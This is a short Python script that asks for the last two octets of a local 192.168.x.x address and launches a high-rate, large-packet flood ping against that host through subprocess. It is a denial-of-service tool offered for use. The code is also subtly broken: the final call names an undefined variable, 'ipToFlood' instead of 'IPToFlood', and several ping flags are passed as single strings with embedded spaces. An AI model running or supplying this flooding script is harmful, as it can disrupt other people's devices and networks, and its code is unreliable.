# Import statements
import subprocess
import sys
import signal

# Functions
def sigint_handler(signal, frame):
    print("\n",'KeyboardInterrupt was caught, exiting script gracefully')
    sys.exit(0)



# Main script

secondLastOctet = ""

secondLastOctet = input("enter the second last octet of the IP to flood, leave blank for 100: ")

if secondLastOctet == "":
    secondLastOctet = 100



lastOctet = input("enter last octet of local IP to flood: ")

IPToFlood = str(f"192.168.{secondLastOctet}.{lastOctet}")

confirmation = input(f"are you sure {IPToFlood} is the right IP? ")

if confirmation != "yes":
    sys.exit("Aborting")
else:
    print("Continuing")

print(f"Flooding {IPToFlood}...")

signal.signal(signal.SIGINT, sigint_handler)
subprocess.run(["ping", ipToFlood, "-t 1", "-i .01", "-l 3", "-f", "-W 0", "-s 60000"])




